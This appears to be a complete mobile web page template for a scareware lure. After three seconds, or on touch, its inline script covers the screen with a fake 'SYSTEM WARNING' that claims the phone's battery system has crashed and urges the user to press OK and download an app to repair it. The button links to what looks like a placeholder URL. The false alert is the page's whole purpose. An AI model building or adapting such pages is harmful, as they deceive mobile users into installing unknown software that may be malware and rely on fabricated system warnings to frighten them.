<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, width=device-width">
<link href="css/css.css?v=7" rel="stylesheet" />
<title></title>
</head>
<body id="body">
<img src="images/1.png" class="timg" />
<div id="cover"></div>
<div class="k_alert" id="kAlert">
    <h1>SYSTEM WARNING</h1>
    <p id="kAlertP">Phone battery syetem is crash! It will significantly reduce battery life and threaten phone safety. Press OK and download app to repair it.</p>
    <a class="k_btn" id="kBtn" href="http://www.baidu.com" target="_blank">OK</a>
</div>
<script type="text/javascript">
window.onload=function(){
	var kAlert=document.getElementById("kAlert");
	var cover=document.getElementById("cover");
	var obody=document.getElementById("body");
	var timer=null;
	timer=setTimeout(function(){
		kAlert.style.display="block";
		cover.style.display="block";
	},3000);
	obody.ontouchstart=obody.ontouchclick=function(){
		clearTimeout(timer);
		kAlert.style.display="block";
		cover.style.display="block";	
	}	
}
</script>
</body>
</html>
